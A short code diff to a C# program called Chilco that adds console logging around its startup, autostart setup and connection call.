@@ -12,12 +12,15 @@ namespace Chilco
         [STAThread]
         private static void Main()
         {
+            Console.WriteLine("Chilco is starting...");
             ImplementAutostart();
+            
             ConnectionHandler.Connect();
         }
 
         public static void ImplementAutostart()
         {
+            Console.WriteLine("Implementing Autostart");
             string startup = Environment.GetFolderPath(Environment.SpecialFolder.CommonStartup);
             string application = System.Reflection.Assembly.GetEntryAssembly().Location;
 
